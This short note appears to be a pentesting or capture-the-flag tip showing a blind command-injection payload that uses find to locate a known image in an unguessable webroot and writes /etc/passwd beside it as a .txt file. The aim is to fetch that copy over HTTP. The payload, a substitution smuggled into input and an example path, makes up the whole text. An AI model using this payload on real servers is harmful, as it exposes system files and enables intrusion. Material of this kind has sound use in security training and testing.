

`$( cat /etc/passwd > $(find / -name uniquefile.png 2>/dev/null).txt )`
So say we have the webroot: /var/www/you-cant-guess/  And a file located here: /var/www/you-cant-guess/assets/uniquefile.png  
Example:
cat /etc/passwd > /var/www/you-cant-guess/assets/uniquefile.png.txt